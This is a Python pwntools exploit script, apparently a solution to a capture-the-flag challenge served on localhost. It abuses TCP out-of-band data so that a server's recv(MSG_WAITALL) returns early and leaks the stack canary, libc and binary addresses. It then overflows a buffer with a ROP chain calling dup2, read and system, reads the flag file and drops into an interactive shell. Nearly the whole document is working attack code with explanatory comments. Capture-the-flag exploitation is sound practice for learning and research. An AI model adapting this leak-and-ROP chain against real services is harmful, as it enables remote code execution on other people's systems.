#!/usr/bin/env python3
from pwn import *
import socket

exe = context.binary = ELF(args.EXE or './chall')
libc = ELF(exe.libc.path)

r = remote('localhost', 31337)

r.send(p64(0x1ff))
r.send(b'A'*0x100)

"""
r.sock.shutdown(socket.SHUT_WR)
	server's recv(MSG_WAITALL) sees EOF before
	all n bytes arrive, so it stops waiting and returns early.

r.sock.send(b"!", socket.MSG_OOB) 
	next byte in the stream becomes “different type” data, which forces recv(MSG_WAITALL) to stop
	reading normal bytes and return whatever it already collected.
"""

r.sock.send(b'!', socket.MSG_OOB)

leaks         = r.recv(0x1ff)[0x100:]
stack         = u64(leaks[0:8]) - 0x1f0
canary        = u64(leaks[8:16])
libc.address  = u64(leaks[24:32]) - 0x2a1ca
exe.address   = u64(leaks[56:64]) - exe.sym.main

"""
pop rdi ; ret                                                        ==> rdi = 4
pop rsi ; ret                                                        ==> rsi = 1
dup(4, 1)

pop rdx ; xor eax, eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret ==> rdx = 0x200 & rax = 0
pop rdi ; ret                                                        ==> rdi = 4
pop rsi ; ret                                                        ==> rsi = 1
read(4, buf, 0x200);

ret                                                                  ==> for alignment
pop rdi ; ret                                                        ==> rdi = ptr to command
system(&cmd)
"""

rop  = b''

rop += p64(libc.address + 0x10f78b)
rop += p64(4)
rop += p64(libc.address + 0x110a7d)
rop += p64(1)
rop += p64(libc.sym.dup2)

rop += p64(libc.address + 0xb503c)
rop += p64(512) + p64(0)*4
rop += p64(libc.address + 0x10f78b)
rop += p64(4)
rop += p64(libc.address + 0x110a7d)
rop += p64(exe.address  + 0x4010)
rop += p64(libc.sym.read)

rop += p64(libc.address + 0x2882f)
rop += p64(libc.address + 0x10f78b)
rop += p64(exe.address  + 0x4010)
rop += p64(libc.sym.system)

r.send(p64(0x100+0x18+len(rop)))
r.send(b"A"*0x100 + p64(0) + p64(canary) + p64(0) + rop)

r.send(p64(0x2000))
r.clean()
r.send(b"cat /flag-*.txt\x00")
#print(r.recvall(timeout=1).strip().decode())
r.interactive()
